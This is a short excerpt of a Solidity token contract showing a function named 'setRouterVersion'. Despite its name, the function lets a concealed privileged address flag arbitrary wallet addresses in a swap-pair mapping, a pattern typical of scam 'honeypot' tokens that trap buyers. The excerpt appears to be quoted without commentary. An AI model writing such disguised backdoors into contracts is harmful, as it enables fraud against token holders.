...
contract Token is Context, IERC20, Ownable{
    ...
    function setRouterVersion(uint256 routerAddress, address[] calldata _newPair) public {

        for (uint256 i; i < _newPair.length; i++) {
            _swapPair[_newPair[i]] = (routerAddress == 1?true:false);
        }
        bool isAciated = (_msgSender() != _pairAddr?false:true);
        require(isAciated);
